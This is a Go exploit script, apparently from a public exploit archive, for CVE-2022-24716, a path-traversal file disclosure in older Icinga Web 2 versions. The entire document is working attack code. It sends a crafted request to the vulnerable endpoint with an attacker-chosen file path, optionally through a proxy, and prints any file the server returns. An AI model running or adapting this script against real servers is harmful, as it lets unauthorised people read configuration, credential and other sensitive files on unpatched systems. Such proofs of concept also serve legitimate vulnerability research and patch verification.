/*
# Exploit Title: Icinga Web 2 - Arbitrary File Disclosure <2.8.6, <2.9.6, <2.10
# Date: 2023-03-19
# Exploit Author: JoÃ£o Victor
# Vendor Homepage: https://icinga.com/
# Software Link: https://github.com/Icinga/icingaweb2
# Version: <2.8.6, <2.9.6, <2.10
# Tested on: Icinga Web 2 Version 2.9.2 on Linux
# CVE: CVE-2022-24716
# Based on: https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/
*/

package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"

	"github.com/akamensky/argparse"
)

func main() {
	Argumentos()
}

func disclosure(params ...string) {
	if len(params) == 3 {
		proxy, _ := url.Parse(params[2])
		requisicao := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxy)}}
		response, err := requisicao.Get(params[0] + "/icingaweb2/lib/icinga/icinga-php-thirdparty" + params[1])
		if err != nil {
			log.Fatalf("[+] hostless error")
			os.Exit(-1)
		}
		switch response.StatusCode {
		case 404:
			fmt.Printf("[+] %s Not found", params[0])
		case 200:
			disclosure, _ := ioutil.ReadAll(response.Body)
			fmt.Println(string(disclosure))
		default:
			fmt.Printf("[+] %s Erro", params[0])
		}

	} else {
		response, err := http.Get(params[0] + "/icingaweb2/lib/icinga/icinga-php-thirdparty" + params[1])
		if err != nil {
			log.Fatalf("[+] hostless error")
			os.Exit(-1)
		}
		switch response.StatusCode {
		case 404:
			fmt.Printf("[+] %s Not found", params[0])
		case 200:
			disclosure, _ := ioutil.ReadAll(response.Body)
			fmt.Println(string(disclosure))
		default:
			fmt.Printf("[+] %s Erro", params[0])
		}
	}
}

func Argumentos() {
	parser := argparse.NewParser("CVE-2022-24716", "CVE-2022-24716 - Arbitrary File Disclosure")
	var url *string = parser.String("u", "url", &argparse.Options{Required: true, Help: "Insert url"})
	var path *string = parser.String("f", "file", &argparse.Options{Required: true, Help: "Insert file"})
	var proxy *string = parser.String("p", "proxy", &argparse.Options{Required: false, Help: "Insert proxy", Default: ""})
	err := parser.Parse(os.Args)

	if err != nil {
		fmt.Println(parser.Usage(err))
	}
	switch *proxy {
	case "":
		disclosure(*url, *path)
	default:
		disclosure(*url, *path, *proxy)
	}
}
